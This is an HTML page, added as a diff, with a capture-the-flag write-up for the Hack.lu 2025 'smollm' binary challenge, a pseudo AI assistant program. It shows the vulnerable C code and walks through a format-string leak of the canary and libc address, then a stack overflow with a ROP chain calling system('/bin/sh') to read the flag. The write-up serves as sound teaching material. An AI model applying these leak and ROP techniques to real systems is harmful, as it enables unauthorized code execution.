@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>cyber-notes</title>
+<meta name="keywords" content="">
+<meta name="description" content="Smollm - Hack.lu 2025
+Introduction
+This challenge is a pseudo AI assistant.
+$ nc SMOLLM.flu.xxx 1024
+Hello, and welcome to smøllm. Your friendly AI assistant.
+You can add you own custom tokens or run a prompt.
+Do you want to
+1) Add a custom token
+2) Run a prompt
+&gt;
+The source code I provided, and here is the sec that seemed to be present on the binary.
+$ checksec smollm
+[*] &#39;/home/dajaaj/personal/hacklu2025/smollm/smollm&#39;
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b&#39;.&#39;
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+Adding a token (8 bytes) will put it at the end of a pre-defined list of words.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/hack.lu-2025/smollm/smollm/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hack.lu-2025/smollm/smollm/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="cyber-notes (Alt + H)">cyber-notes</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/challenges/" title="Challenges">
+                    <span>Challenges</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/research/" title="Research">
+                    <span>Research</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      
+    </h1>
+    <div class="post-meta"><span>5 min</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="smollm---hacklu-2025">Smollm - Hack.lu 2025<a hidden class="anchor" aria-hidden="true" href="#smollm---hacklu-2025">#</a></h1>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>This challenge is a pseudo AI assistant.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nc SMOLLM.flu.xxx <span style="color:#ae81ff">1024</span>
+</span></span><span style="display:flex;"><span>Hello, and welcome to smøllm. Your friendly AI assistant.
+</span></span><span style="display:flex;"><span>You can add you own custom tokens or run a prompt.
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;
+</span></span></code></pre></div><p>The source code I provided, and here is the sec that seemed to be present on the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec smollm
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/dajaaj/personal/hacklu2025/smollm/smollm&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:      Canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        PIE enabled
+</span></span><span style="display:flex;"><span>    RUNPATH:    b<span style="color:#e6db74">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
+</span></span><span style="display:flex;"><span>    IBT:        Enabled
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><p>Adding a token (8 bytes) will put it at the end of a pre-defined list of words.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;1
+</span></span><span style="display:flex;"><span>token?&gt;tonio
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add_token</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> token, <span style="color:#66d9ef">int</span> len) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n_tokens <span style="color:#f92672">==</span> <span style="color:#ae81ff">256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Max number of tokens reached!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(tokens[n_tokens], token, len);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(tokens[n_tokens<span style="color:#f92672">++</span>] <span style="color:#f92672">+</span> len, <span style="color:#e6db74">&#39; &#39;</span>, TOKEN_SIZE <span style="color:#f92672">-</span> len);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Whereas running the prompt will ask for some input and print random words based on that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;Hi?
+</span></span><span style="display:flex;"><span>tell    tonio
+</span></span><span style="display:flex;"><span>  plfanzencould
+</span></span></code></pre></div><h2 id="vulnerabilities">Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#vulnerabilities">#</a></h2>
+<p>We can se two main vulnerabilities in the code which are both in the <code>run_prompt</code> function.</p>
+<p>This function simulate the AI assistant.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run_prompt</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> n;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> combinator <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> in_buf[<span style="color:#ae81ff">256</span>], out_buf[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bzero</span>(in_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bzero</span>(out_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;How can I help you?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(STDIN_FILENO, in_buf, <span style="color:#66d9ef">sizeof</span>(in_buf));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Read error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>out_buf[i<span style="color:#f92672">*</span>TOKEN_SIZE], tokens[(in_buf[i] <span style="color:#f92672">+</span> combinator<span style="color:#f92672">++</span>) <span style="color:#f92672">%</span> n_tokens], TOKEN_SIZE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(out_buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="format-string">Format String<a hidden class="anchor" aria-hidden="true" href="#format-string">#</a></h3>
+<p>At the end of the function we can see that the <code>out_buf</code> will be printed as a format string, so we can use it to leak the stack.</p>
+<h3 id="stack-based-buffer-overflow">Stack based buffer overflow<a hidden class="anchor" aria-hidden="true" href="#stack-based-buffer-overflow">#</a></h3>
+<p>The memcpy will write after the <code>out_buf</code> after <code>i=32</code>, cause its size is <code>256</code>. <br>
+<code>32*TOKEN_SIZE = 32*8 = 256</code>.</p>
+<p>With this finds we can read and control the stack !</p>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>As <code>ASLR</code> is enabled we&rsquo;ll need to first leak some addresses on the stack to then construct a ROP chain (<code>NX</code> is enabled).</p>
+<p>But first we need to understand the words selection logic.</p>
+<h3 id="logic">Logic<a hidden class="anchor" aria-hidden="true" href="#logic">#</a></h3>
+<p>Above is the code that choose the 8 bytes word to write to <code>out_buf</code> baised on our input.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>out_buf[i<span style="color:#f92672">*</span>TOKEN_SIZE], tokens[(in_buf[i] <span style="color:#f92672">+</span> combinator<span style="color:#f92672">++</span>) <span style="color:#f92672">%</span> n_tokens], TOKEN_SIZE);
+</span></span></code></pre></div><p>So if we want the token we added to be printed we need to use the following formula: <code>token_index - i - combinator</code>.</p>
+<h3 id="stack-leak">Stack leak<a hidden class="anchor" aria-hidden="true" href="#stack-leak">#</a></h3>
+<p>To leak the stack we can add the following token: <code>%p%p%p%p</code>, and print it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;1
+</span></span><span style="display:flex;"><span>token?&gt;%p%p%p%p
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;Invalid choice
+</span></span><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;j
+</span></span><span style="display:flex;"><span>0x10x20x10x5711695493c0can
+</span></span></code></pre></div><p>Here we leak !</p>
+<p>We can see an &ldquo;invalide choice&rdquo; message, as <code>add_token</code> only reads 8 bytes, the <code>\n</code> will be red after.</p>
+<p>Now let&rsquo;s try to print our token 32 time:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Do you want to
+</span></span><span style="display:flex;"><span>1<span style="color:#f92672">)</span> Add a custom token
+</span></span><span style="display:flex;"><span>2<span style="color:#f92672">)</span> Run a prompt
+</span></span><span style="display:flex;"><span>&gt;2
+</span></span><span style="display:flex;"><span>How can I help you?
+</span></span><span style="display:flex;"><span>&gt;jihgfedcba<span style="color:#e6db74">`</span>_^<span style="color:#f92672">]</span><span style="color:#ae81ff">\[</span>ZYXWVUTSRQPONMLK
+</span></span><span style="display:flex;"><span>0x200x210x200x6248b7acb3c00x636465666768696a0x5b5c5d5e5f6061620x535455565758595a0x4b4c4d4e4f5051520xa<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020776f6e6b0x141d53f320319c000x7fff3701ce6f0x6248b7ac8474<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x32000000000000000x7025702570250a0x141d53f320319c00<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7fff3701cfc80x7fff3701cf400x1<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7a862a7211ca0x7fff3701cef00x7fff3701cfc80x1b7ac60400x6248b7ac83890x7fff3701cfc80xe36d61cfae476dae0x1<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x6248b7acad900x7a862a9430000xe36d61cfada76dae0xe99f5b2813c56dae0x7fff00000000<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x10x7fff3701cfc00x141d53f320319c000x7fff3701cfa00x7a862a72128b0x7fff3701cfd80x6248b7acad900x7fff3701cfd80x6248b7ac8389<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x6248b7ac80400x7fff3701cfc0<span style="color:#f92672">(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)(</span>nil<span style="color:#f92672">)</span>0x6248b7ac80650x7fff3701cfb80x380x10x7fff3701dfc8<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x7fff3701dfd9<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>0x210x7fff371530000x330xd300x100x178bfbff0x6know
+</span></span></code></pre></div><p>Here because of the <code>\n</code>, we already write out of the buffer.</p>
+<p>All the <code>0x7025702570257025</code> are our <code>%p</code>.</p>
+<h3 id="stack-overwrite">Stack overwrite<a hidden class="anchor" aria-hidden="true" href="#stack-overwrite">#</a></h3>
+<p>If we try to print 33 time our token:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span></code></pre></div><p>We hit the canary&hellip; But we leaked it earlier ! So we just have to do a first leak from a first run_prompt and then overwrite the canay with the value we got from the leak.</p>
+<p>The stack like that:</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address][ ??? ]</code></p>
+<h3 id="rop">ROP<a hidden class="anchor" aria-hidden="true" href="#rop">#</a></h3>
+<p>As we control the return address, we might be able to do a ROP ! But with <strong>PIE</strong> and <strong>ASLR</strong> on it seems complicated :/</p>
+<p>Fortunatly an address of the libc is present in the stack&rsquo;s leak (0x7a862a7211ca in the leak above).</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address ][ ??? ][ ... ][ libc address ]</code></p>
+<p>And <strong>system</strong> and <strong>/bin/sh</strong> are present in the provided libc :)</p>
+<p>So we can create a shell !</p>
+<p>We will overwrite the stack to get something like that:</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ system ]</code></p>
+<p>There is a last problem which I figure out but looking at <code>/tmp/core.smollm.&lt;pid&gt;</code> file, when a program crashes it creates this file which you can analyse in gdb.
+And I saw the following error.</p>
+<pre tabindex="0"><code>0x7f753b65843b    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffd8e1025e8] not aligned to 16 bytes&gt;
+</code></pre><p>After looking at <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment">some blog post</a> I figure out that adding a ret gadget would do the job.</p>
+<p><code>[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ ret ][ system ]</code></p>
+<p>Tada !!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ cat flag
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Feel free to read my script, even if its a bit messy Xd.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">cyber-notes</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
